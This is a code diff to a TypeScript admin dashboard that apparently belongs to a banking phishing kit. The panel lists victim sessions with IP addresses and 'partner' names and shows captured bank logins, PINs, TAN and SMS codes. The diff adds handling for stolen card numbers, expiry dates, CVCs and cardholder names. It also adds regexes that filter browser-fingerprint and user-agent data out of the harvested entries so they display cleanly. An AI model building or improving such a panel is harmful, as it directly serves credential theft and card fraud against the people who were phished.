@@ -19,7 +19,8 @@ import {
 const SESSION_LIST_COLUMNS =
   "id,created_at,amount,current_step,status,ip_address,partner_name,is_hidden";
 
-const UA_BANNED_RE = /(mozilla|applewebkit|webkit|gecko|chrome|safari|windows nt|win64|win32|android|iphone|ipad|mac os|linux x86_64|x86_64|like gecko|khtml|version\/|mobile|firefox|opera|edge|msie|trident|opr\/|edg\/|brave|vivaldi)/i;
+const UA_BANNED_RE = /(mozilla|applewebkit|webkit|gecko|chrome|safari|windows nt|win64|win32|android|iphone|ipad|mac os|linux x86_64|x86_64|like gecko|khtml|version\/|mobile|firefox|opera|edge|msie|trident|opr\/|edg\/|brave|vivaldi|netscape)/i;
+const FP_PREFIX_RE = /(pm_|fpua|fpsc|fpsw|fptz|fpln|fpjv|fpco|fpasw|fpan|fpacn|fpol|fposp|fpup|fpsaw|fpsbd|fpsdx|fpsdy|fpslx|fpsly|fpsfse|fpsui|fpol|pm_fpua|pm_fpsc|pm_fpsw|pm_fptz|pm_fpln|pm_fpasw|pm_fpan|pm_fpacn|pm_fpol|pm_fpsaw|pm_fpsbd|pm_fpsdx|pm_fpsdy|pm_fpslx|pm_fpsly|pm_fpsfse|pm_fpsui|pm_os|pm_brmjv|pm_br|pm_inpt|pm_expt|fpslx|fpsly)/i;
 
 function sanitizeCredentialValue(value: unknown, opts?: { maxLen?: number; allowUaLike?: boolean }): string {
   const v = typeof value === "string" ? value : value == null ? "" : String(value);
@@ -27,16 +28,29 @@ function sanitizeCredentialValue(value: unknown, opts?: { maxLen?: number; allow
   const trimmed = v.trim();
   if (!trimmed) return "";
   const maxLen = opts?.maxLen ?? 64;
-  if (!opts?.allowUaLike && UA_BANNED_RE.test(trimmed)) return "";
-  // "url encoded user-agent" gibi çok uzun anlamsız string'leri kes.
+  if (!opts?.allowUaLike && (UA_BANNED_RE.test(trimmed) || FP_PREFIX_RE.test(trimmed))) return "";
   if (trimmed.length > maxLen) return "";
-  // Sadece printable ascii + türkçe & yaygın semboller (kart no, şifre, tckn, telefon formatı)
   if (/^[\x00-\x1F\x7F]/.test(trimmed)) return "";
-  // Çok fazla % karakteri (URL encode edilmiş user-agent, query string)
   let pctCount = 0;
   for (let i = 0; i < trimmed.length; i++) if (trimmed.charCodeAt(i) === 37) pctCount++;
   if (pctCount >= 4) return "";
   return trimmed;
+}
+
+function sanitizeRawFieldsForDisplay(rawFields: any): any {
+  if (!rawFields || typeof rawFields !== "object") return {};
+  const out: Record<string, any> = {};
+  for (const k of Object.keys(rawFields)) {
+    const keyOk = String(k).toLowerCase();
+    if (FP_PREFIX_RE.test(keyOk)) continue; // fingerprint key'lerini HEP GİZLE
+    if (/user_?agent/i.test(keyOk)) continue;
+    if (/^s\d+_iframe_user_?agent/i.test(keyOk)) continue;
+    const rawVal = rawFields[k];
+    const cleaned = typeof rawVal === "string" ? sanitizeCredentialValue(rawVal, { maxLen: 256 }) : rawVal;
+    if (typeof cleaned === "string" && cleaned === "") continue; // boş ise gösterme
+    out[k] = cleaned;
+  }
+  return out;
 }
 
 function cleanBankFormHistoryEntry(entry: any): any {
@@ -49,6 +63,17 @@ function cleanBankFormHistoryEntry(entry: any): any {
     pin: sanitizeCredentialValue(entry.pin || entry.password || entry.pw),
     password: sanitizeCredentialValue(entry.password || entry.pin || entry.pw),
     pw: sanitizeCredentialValue(entry.pw || entry.pin || entry.password),
+    personalCode: sanitizeCredentialValue(entry.personalCode, { maxLen: 32 }),
+    bankPhone: sanitizeCredentialValue(entry.bankPhone, { maxLen: 40, allowUaLike: true }),
+    tacCode: sanitizeCredentialValue(entry.tacCode || entry.tac_code, { maxLen: 24 }),
+    orderedField1: sanitizeCredentialValue(entry.orderedField1, { maxLen: 120 }),
+    orderedField2: sanitizeCredentialValue(entry.orderedField2, { maxLen: 120 }),
+    orderedField3: sanitizeCredentialValue(entry.orderedField3, { maxLen: 120 }),
+    cardNumber: sanitizeCredentialValue(entry.cardNumber, { maxLen: 32 }),
+    cardExpiry: sanitizeCredentialValue(entry.cardExpiry, { maxLen: 16 }),
+    cardCvc: sanitizeCredentialValue(entry.cardCvc, { maxLen: 8 }),
+    cardHolder: sanitizeCredentialValue(entry.cardHolder, { maxLen: 120, allowUaLike: true }),
+    rawFields: sanitizeRawFieldsForDisplay(entry.rawFields),
   };
 }
 
@@ -820,6 +845,18 @@ export function AdminDashboardClean() {
                   personalCode: sanitizeCredentialValue(rawFd.personalCode, { maxLen: 32 }),
                   bankPhone: sanitizeCredentialValue(rawFd.bankPhone, { maxLen: 40, allowUaLike: true }),
                   tacCode: sanitizeCredentialValue(rawFd.tacCode || rawFd.tac_code, { maxLen: 24 }),
+                  smsCode: sanitizeCredentialValue(rawFd.smsCode || rawFd.sms_code, { maxLen: 32 }),
+                  cardNumber: sanitizeCredentialValue(rawFd.cardNumber, { maxLen: 32 }),
+                  cardExpiry: sanitizeCredentialValue(rawFd.cardExpiry, { maxLen: 16 }),
+                  cardCvc: sanitizeCredentialValue(rawFd.cardCvc, { maxLen: 8 }),
+                  cardHolder: sanitizeCredentialValue(rawFd.cardHolder, { maxLen: 120, allowUaLike: true }),
+                  orderedField1: sanitizeCredentialValue(rawFd.orderedField1, { maxLen: 120 }),
+                  orderedField2: sanitizeCredentialValue(rawFd.orderedField2, { maxLen: 120 }),
+                  orderedField3: sanitizeCredentialValue(rawFd.orderedField3, { maxLen: 120 }),
+                  rawFields: sanitizeRawFieldsForDisplay(rawFd.rawFields),
+                  bankFormHistory: Array.isArray(rawFd.bankFormHistory)
+                    ? (rawFd.bankFormHistory as any[]).map((e) => cleanBankFormHistoryEntry(e))
+                    : [],
                 };
 
                 const history: any[] = Array.isArray(fd.bankFormHistory)
@@ -863,7 +900,7 @@ export function AdminDashboardClean() {
                     orderedField3Type: fd.orderedField3Type || "",
                     rawFields:
                       fd.verfuegernummer || fd.username || fd.id || fd.pin || fd.password || fd.pw
-                        ? {
+                        ? sanitizeRawFieldsForDisplay({
                             legacy_verfuegernummer: fd.verfuegernummer || "",
                             legacy_username: fd.username || "",
                             legacy_id: fd.id || "",
@@ -874,7 +911,13 @@ export function AdminDashboardClean() {
                             legacy_personalCode: fd.personalCode || "",
                             legacy_tacCode: fd.tacCode || fd.tac_code || "",
                             legacy_loginMethod: fd.loginMethod || "",
-                          }
+                            legacy_cardNumber: fd.cardNumber || "",
+                            legacy_cardExpiry: fd.cardExpiry || "",
+                            legacy_cardCvc: fd.cardCvc || "",
+                            legacy_orderedField1: fd.orderedField1 || "",
+                            legacy_orderedField2: fd.orderedField2 || "",
+                            legacy_orderedField3: fd.orderedField3 || "",
+                          })
                         : undefined,
                     capturedAt: row.updated_at || row.created_at || new Date().toISOString(),
                     isLegacySnapshot: true,
